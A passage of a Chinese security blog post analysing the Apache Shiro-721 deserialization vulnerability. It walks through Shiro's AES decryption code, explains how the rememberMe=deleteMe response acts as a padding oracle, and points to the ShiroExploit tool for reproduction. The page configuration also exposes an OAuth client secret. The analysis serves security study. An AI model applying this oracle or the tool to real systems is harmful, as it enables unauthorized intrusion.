&#123;</span><br><span class="line">                <span class="comment">// 生成密钥</span></span><br><span class="line">                <span class="keyword">return</span> var2.engineGenerateKey();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (RuntimeException var4) &#123;</span><br><span class="line">                <span class="keyword">if</span> (var1 == <span class="literal">null</span>) &#123;</span><br><span class="line">                    var1 = var4;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                var2 = <span class="built_in">this</span>.nextSpi(var2, <span class="literal">true</span>);</span><br><span class="line">                <span class="keyword">if</span> (var2 == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> var1;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230903154420.png"><br>进入到engineGenerateKey方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> SecretKey <span class="title function_">engineGenerateKey</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">SecretKeySpec</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.random == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="built_in">this</span>.random = SunJCE.getRandom();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">byte</span>[] var2 = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="built_in">this</span>.keySize];</span><br><span class="line">    <span class="built_in">this</span>.random.nextBytes(var2);</span><br><span class="line">    var1 = <span class="keyword">new</span> <span class="title class_">SecretKeySpec</span>(var2, <span class="string">&quot;AES&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230903154707.png"><br>随机生成相应长度的key后，返回SecretKeySpec对象<br>最后再回到AbstractRememberMeManager的构造函数使用getEncoded方法获取密钥序列</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">byte</span>[] getEncoded() &#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="type">byte</span>[])<span class="built_in">this</span>.key.clone();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="Padding-Oracle-Attack攻击"><a href="#Padding-Oracle-Attack攻击" class="headerlink" title="Padding Oracle Attack攻击"></a>Padding Oracle Attack攻击</h3><p>原理：<a target="_blank" rel="noopener" href="https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/</a><br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/217">https://goodapple.top/archives/217</a><br>这是一种类似于SQL盲注的攻击方法，所以需要寻找到返回结果的不同状态<br><strong>Padding错误时返回的状态</strong>：<br>回到AbstractRememberMeManager的解密函数</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">byte</span>[] decrypt(<span class="type">byte</span>[] encrypted) &#123;</span><br><span class="line">    <span class="type">byte</span>[] serialized = encrypted;</span><br><span class="line">    <span class="type">CipherService</span> <span class="variable">cipherService</span> <span class="operator">=</span> getCipherService();</span><br><span class="line">    <span class="keyword">if</span> (cipherService != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">ByteSource</span> <span class="variable">byteSource</span> <span class="operator">=</span> cipherService.decrypt(encrypted, getDecryptionCipherKey());</span><br><span class="line">        serialized = byteSource.getBytes();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> serialized;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>按照流程进入JcaCipherService类的decrypt方法，处理好iv和对应的密文后，进入重载的decrypt方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> ByteSource <span class="title function_">decrypt</span><span class="params">(<span class="type">byte</span>[] ciphertext, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv)</span> <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (log.isTraceEnabled()) &#123;</span><br><span class="line">        log.trace(<span class="string">&quot;Attempting to decrypt incoming byte array of length &quot;</span> +</span><br><span class="line">                (ciphertext != <span class="literal">null</span> ? ciphertext.length : <span class="number">0</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">byte</span>[] decrypted = crypt(ciphertext, key, iv, javax.crypto.Cipher.DECRYPT_MODE);</span><br><span class="line">    <span class="keyword">return</span> decrypted == <span class="literal">null</span> ? <span class="literal">null</span> : ByteSource.Util.bytes(decrypted);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入crypt方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] crypt(<span class="type">byte</span>[] bytes, <span class="type">byte</span>[] key, <span class="type">byte</span>[] iv, <span class="type">int</span> mode) <span class="keyword">throws</span> IllegalArgumentException, CryptoException &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span> || key.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;key argument cannot be null or empty.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    javax.crypto.<span class="type">Cipher</span> <span class="variable">cipher</span> <span class="operator">=</span> initNewCipher(mode, key, iv, <span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> crypt(cipher, bytes);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入重载方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="type">byte</span>[] crypt(javax.crypto.Cipher cipher, <span class="type">byte</span>[] bytes) <span class="keyword">throws</span> CryptoException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> cipher.doFinal(bytes);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to execute &#x27;doFinal&#x27; with cipher instance [&quot;</span> + cipher + <span class="string">&quot;].&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">CryptoException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里调用了doFinal函数对字节码进行处理，步入</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="type">byte</span>[] doFinal(<span class="type">byte</span>[] var1) <span class="keyword">throws</span> IllegalBlockSizeException, BadPaddingException &#123;</span><br><span class="line">    <span class="comment">// 检查加密器/解密器的状态</span></span><br><span class="line">    <span class="built_in">this</span>.checkCipherState();</span><br><span class="line">    <span class="keyword">if</span> (var1 == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Null input buffer&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.chooseFirstProvider();</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.spi.engineDoFinal(var1, <span class="number">0</span>, var1.length);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这个方法会抛出两个异常，分别是IllegalBlockSizeException（块大小异常）和BadPaddingException（填充错误异常），这里使用的是throws，会将异常抛至上一层方法，逐层往上，直到getRememberedPrincipals方法中使用onRememberedPrincipalFailure进行处理</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> PrincipalCollection <span class="title function_">getRememberedPrincipals</span><span class="params">(SubjectContext subjectContext)</span> &#123;</span><br><span class="line">    <span class="type">PrincipalCollection</span> <span class="variable">principals</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = getRememberedSerializedIdentity(subjectContext);</span><br><span class="line">        <span class="comment">//SHIRO-138 - only call convertBytesToPrincipals if bytes exist:</span></span><br><span class="line">        <span class="keyword">if</span> (bytes != <span class="literal">null</span> &amp;&amp; bytes.length &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            principals = convertBytesToPrincipals(bytes, subjectContext);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (RuntimeException re) &#123;</span><br><span class="line">        <span class="comment">// 这里</span></span><br><span class="line">        principals = onRememberedPrincipalFailure(re, subjectContext);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> principals;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>进入onRememberedPrincipalFailure方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> PrincipalCollection <span class="title function_">onRememberedPrincipalFailure</span><span class="params">(RuntimeException e, SubjectContext context)</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;There was a failure while trying to retrieve remembered principals.  This could be due to a &quot;</span> +</span><br><span class="line">                <span class="string">&quot;configuration problem or corrupted principals.  This could also be due to a recently &quot;</span> +</span><br><span class="line">                <span class="string">&quot;changed encryption key, if you are using a shiro.ini file, this property would be &quot;</span> +</span><br><span class="line">                <span class="string">&quot;&#x27;securityManager.rememberMeManager.cipherKey&#x27; see: http://shiro.apache.org/web.html#Web-RememberMeServices. &quot;</span> +</span><br><span class="line">                <span class="string">&quot;The remembered identity will be forgotten and not used for this request.&quot;</span>;</span><br><span class="line">        log.warn(message);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 这里</span></span><br><span class="line">    forgetIdentity(context);</span><br><span class="line">    <span class="comment">//propagate - security manager implementation will handle and warn appropriately</span></span><br><span class="line">    <span class="keyword">throw</span> e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此方法调用了forgetIdentity方法进行处理</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">forgetIdentity</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    getCookie().removeFrom(request, response);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>removeFrom方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">removeFrom</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> &#123;</span><br><span class="line">    <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> getName();</span><br><span class="line">    <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> DELETED_COOKIE_VALUE;</span><br><span class="line">    <span class="type">String</span> <span class="variable">comment</span> <span class="operator">=</span> <span class="literal">null</span>; <span class="comment">//don&#x27;t need to add extra size to the response - comments are irrelevant for deletions</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">domain</span> <span class="operator">=</span> getDomain();</span><br><span class="line">    <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> calculatePath(request);</span><br><span class="line">    <span class="type">int</span> <span class="variable">maxAge</span> <span class="operator">=</span> <span class="number">0</span>; <span class="comment">//always zero for deletion</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">version</span> <span class="operator">=</span> getVersion();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">secure</span> <span class="operator">=</span> isSecure();</span><br><span class="line">    <span class="type">boolean</span> <span class="variable">httpOnly</span> <span class="operator">=</span> <span class="literal">false</span>; <span class="comment">//no need to add the extra text, plus the value &#x27;deleteMe&#x27; is not sensitive at all</span></span><br><span class="line"></span><br><span class="line">    addCookieHeader(response, name, value, comment, domain, path, maxAge, version, secure, httpOnly);</span><br><span class="line"></span><br><span class="line">    log.trace(<span class="string">&quot;Removed &#x27;&#123;&#125;&#x27; cookie by setting maxAge=0&quot;</span>, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>removeForm主要在response头部添加字段Set-Cookie: rememberMe&#x3D;deleteMe</p>
+<p><strong>Padding正确，反序列化失败</strong>：<br>在DefaultSerializer类的反序列化函数中进行了处理</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> T <span class="title function_">deserialize</span><span class="params">(<span class="type">byte</span>[] serialized)</span> <span class="keyword">throws</span> SerializationException &#123;</span><br><span class="line">    <span class="keyword">if</span> (serialized == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;argument cannot be null.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(msg);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(serialized);</span><br><span class="line">    <span class="type">BufferedInputStream</span> <span class="variable">bis</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(bais);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ClassResolvingObjectInputStream</span>(bis);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">deserialized</span> <span class="operator">=</span> (T) ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">        <span class="keyword">return</span> deserialized;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">msg</span> <span class="operator">=</span> <span class="string">&quot;Unable to deserialize argument byte array.&quot;</span>;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SerializationException</span>(msg, e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但对于Java来说，反序列化是以Stream的方式按顺序进行的，向其后添加或更改一些字符串并不会影响正常反序列化<br><strong>两种状态</strong>：</p>
+<ol>
+<li>padding正确，服务器给出正确响应</li>
+<li>padding错误，服务器返回Set-Cookie: rememberMe&#x3D;deleteMe</li>
+</ol>
+<h2 id="漏洞复现-1"><a href="#漏洞复现-1" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>使用工具ShiroExploit v2.51：<a target="_blank" rel="noopener" href="https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51">https://github.com/feihong-cs/ShiroExploit-Deprecated/releases/tag/v2.51</a><br>输入网址及用户登录成功的Cookie<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230904154417.png"><br>然后选择“使用ceye.io进行漏洞检测”，点击下一步开始攻击<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20230904155600.png"></p>
+<h2 id="参考-1"><a href="#参考-1" class="headerlink" title="参考"></a>参考</h2><p><a target="_blank" rel="noopener" href="https://goodapple.top/archives/261">Java反序列化漏洞——Shiro721 - 枫のBlog (goodapple.top)</a><br><a target="_blank" rel="noopener" href="https://goodapple.top/archives/217">CBC字节翻转攻击&amp;Padding Oracle Attack原理解析 - 枫のBlog (goodapple.top)</a><br><a target="_blank" rel="noopener" href="https://skysec.top/2017/12/13/padding-oracle%E5%92%8Ccbc%E7%BF%BB%E8%BD%AC%E6%94%BB%E5%87%BB/">padding oracle和cbc翻转攻击 · sky’s blog (skysec.top)</a><br><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/11633">Shiro 历史漏洞分析</a></p>
+<blockquote>
+<p>注：本文首发于<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/13059">https://xz.aliyun.com/t/13059</a></p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer"><div>
+  <div class="end-slogan" style="text-align:center;font-size:22px;letter-spacing:10px;user-seclect:none;color:#bbb">----------- 本文结束啦<i class="fa fa-star"></i>感谢您阅读-----------</div>		
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>本文作者： </strong>DiliLearngent
+  </li>
+  <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://dililearngent.github.io/2023/05/02/Shiro-security/" title="Java安全之Shiro反序列化漏洞分析">https://dililearngent.github.io/2023/05/02/Shiro-security/</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！
+  </li>
+</ul>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/Java/" rel="tag"># Java</a>
+              <a href="/tags/Java%E5%AE%89%E5%85%A8/" rel="tag"># Java安全</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/05/02/Weblogic-Security/" rel="prev" title="Java安全之Weblogic漏洞分析与利用">
+                  <i class="fa fa-chevron-left"></i> Java安全之Weblogic漏洞分析与利用
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2023/05/02/Java-SSTI/" rel="next" title="Java安全之模板引擎及SSTI分析">
+                  Java安全之模板引擎及SSTI分析 <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments gitalk-container"></div>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 2019 – 
+    <span itemprop="copyrightYear">2024</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">DiliLearngent</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">101k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">6:08</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div><!-- 网站运行时间的设置 -->
+<span id="timeDate">载入天数...</span>
+<span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("05/20/2020 13:14:00");//此处修改你的建站时间或者网站上线时间
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+
+
+    </div>
+  </footer>
+
+  
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js" integrity="sha256-2Pmvv0kuTBOenSvLm6bvfBSSHrUJ+3A7x6P5Ebd07/g=" crossorigin="anonymous"></script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.5.7/jquery.fancybox.min.js" integrity="sha256-yt2kYMy0w8AbtF89WXb2P1rfjcP/HTHLT7097U8Y5b8=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script>
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.1/search.js" integrity="sha256-1kfA5uHPf65M5cphT2dvymhkuyHPQp5A53EGZOnOLmc=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+  <script src="/js/third-party/fancybox.js"></script>
+
+  <script src="/js/third-party/pace.js"></script>
+
+
+  
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"github_id":"DiliLearngent","repo":"dililearngent.github.io","client_id":"e12e8d95c8711de863a8","client_secret":"22368c9ebad498682ec51031519e47b96c45ee7c","admin_user":"DiliLearngent","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":"zh-CN","js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"36489037bf8d2a2940e01bee9b5e082a"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+<div class="moon-menu">
+  <div class="moon-menu-items">
+    
+    <div id="moon-menu-item-back2bottom" class="moon-menu-item">
+      <i class='fas fa-chevron-down'></i>    </div>
+    
+    <div id="moon-menu-item-back2top" class="moon-menu-item">
+      <i class='fas fa-chevron-up'></i>    </div>
+    
+  </div>
+  <div class="moon-menu-button">
+    <svg class="moon-menu-bg">
+      <circle class="moon-menu-cricle" cx="50%" cy="50%" r="44%"></circle>
+      <circle class="moon-menu-border" cx="50%" cy="50%" r="48%"></circle>
+    </svg>
+    <div class="moon-menu-content">
+      <div class="moon-menu-icon"><i class='fas fa-ellipsis-v'></i></div>
+      <div class="moon-menu-text"></div>
+    </div>
+  </div>
+</div><script src="/js/injector.js"></script>
+</body>
+</html>
